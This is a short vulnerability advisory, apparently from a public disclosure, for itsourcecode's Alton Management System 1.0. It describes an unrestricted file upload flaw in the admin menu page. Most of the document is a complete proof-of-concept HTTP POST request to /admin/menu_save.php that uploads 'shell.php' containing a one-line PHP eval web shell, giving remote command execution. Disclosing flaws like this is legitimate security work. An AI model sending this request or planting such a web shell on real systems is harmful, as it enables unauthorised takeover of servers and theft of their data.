# Vendor

itsourcecode

# Product

Alton Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2020/02/altonsystem.zip

# Description

Log in to the backend administrator account, access the "/admin/menu.php" page, add a menu option, and there is no strict filtering in the uploaded images, PHP files can be directly uploaded.
<img width="911" alt="image" src="https://github.com/user-attachments/assets/776894c0-eaac-4df3-9276-ef41c8824015">

# Poc
```
POST /admin/menu_save.php HTTP/1.1
Host: 192.168.17.24
Content-Length: 591
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.17.24
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZiHCNDLyEF0BsCXQ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.17.24/admin/menu.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: counter_date=24; my_lang=en; login_remember=0; member_perPage=30; member_sort=id%20desc; pdpa_consent=%7B%22accept%22%3A1%2C%22create_date%22%3A%222024-07-24%2016%3A04%3A19%22%7D; admin-menu=%7B%220%22%3A1%2C%221%22%3A1%2C%222%22%3A1%7D; curSection_template_options=%22shablon%22; 192.168.17.24-admin-files1=%7B%220%22%3A1%7D; sed5a3c60d7b93ebd48=MDpfOjA6XzpzeW1wZnk%3D; style=null; sedf49cfc2e14a6d706=MDpfOjA6XzpzeW1wZnk%3D; CONCRETE_LOGIN=1; PHPSESSID=m0khm20odq7l4oj4f5aca2q94p
Connection: close

------WebKitFormBoundaryZiHCNDLyEF0BsCXQ
Content-Disposition: form-data; name="menu"

DeeMirage
------WebKitFormBoundaryZiHCNDLyEF0BsCXQ
Content-Disposition: form-data; name="cat"

12
------WebKitFormBoundaryZiHCNDLyEF0BsCXQ
Content-Disposition: form-data; name="desc"

aa
------WebKitFormBoundaryZiHCNDLyEF0BsCXQ
Content-Disposition: form-data; name="price"

aaa
------WebKitFormBoundaryZiHCNDLyEF0BsCXQ
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: text/php

<?php eval($_POST["cmd"]);?>

------WebKitFormBoundaryZiHCNDLyEF0BsCXQ--

```

